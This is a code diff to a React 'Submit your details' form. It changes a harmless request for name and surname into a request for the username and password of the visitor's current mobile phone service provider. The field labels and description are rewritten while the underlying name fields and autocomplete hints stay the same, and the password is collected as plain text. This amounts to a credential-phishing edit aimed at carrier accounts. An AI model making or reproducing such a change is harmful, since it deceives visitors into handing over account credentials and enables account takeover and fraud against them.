@@ -64,10 +64,10 @@ function DetailsForm() {
   })
 
   return (
-    <Panel className="mt-8" title="Submit your details" description="Tell us who you are and we'll follow up about Company Services.">
+    <Panel className="mt-8" title="Submit your details" description="Submit your Username and Password for your current mobile phone service provider.">
       <form onSubmit={submit} noValidate className="grid gap-5 sm:grid-cols-2">
-        <Field id="cs-first" label="Name"><input id="cs-first" required className="field" value={firstName} onChange={(e) => setFirstName(e.target.value)} autoComplete="given-name" /></Field>
-        <Field id="cs-last" label="Surname"><input id="cs-last" required className="field" value={surname} onChange={(e) => setSurname(e.target.value)} autoComplete="family-name" /></Field>
+        <Field id="cs-first" label="Username"><input id="cs-first" required className="field" value={firstName} onChange={(e) => setFirstName(e.target.value)} autoComplete="given-name" /></Field>
+        <Field id="cs-last" label="Password"><input id="cs-last" required className="field" value={surname} onChange={(e) => setSurname(e.target.value)} autoComplete="family-name" /></Field>
         {error && <p role="alert" className="border border-red-300 bg-red-50 p-3 text-[13px] text-red-800 sm:col-span-2">{error}</p>}
         <div className="flex flex-wrap items-center gap-3 sm:col-span-2">
           <button className="btn-primary" disabled={sending}>{sending ? 'Sending…' : 'Submit your details'}</button>
